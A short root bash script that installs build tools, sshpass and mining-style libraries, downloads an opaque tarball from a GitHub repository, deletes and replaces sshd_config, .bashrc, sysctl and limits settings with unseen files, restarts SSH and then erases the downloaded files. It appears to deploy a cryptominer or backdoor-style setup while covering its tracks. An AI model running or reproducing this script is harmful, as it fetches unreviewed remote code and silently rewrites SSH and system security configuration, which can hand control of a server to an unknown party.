#!/bin/bash
apt-get update -y
apt-get upgrade -y
apt install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen psmisc iputils-ping sshpass
wget https://raw.githubusercontent.com/Kygo69/x/master/x.tar.gz
tar -zxvf x.tar.gz
cp -r /root/x/sources/src /root/
rm -rf /etc/security/limits.conf /etc/sysctl.conf /etc/ssh/sshd_config /root/.bashrc
cp /root/x/conf/.bashrc /root/
cp /root/x/conf/sshd_config /etc/ssh/
cp /root/x/conf/limits.conf /etc/security/
cp /root/x/conf/sysctl.conf /etc/
service ssh restart
mkdir -p /root/.ssh/
cp /root/x/conf/config /root/.ssh/
rm -rf /root/x /root/x.tar.gz
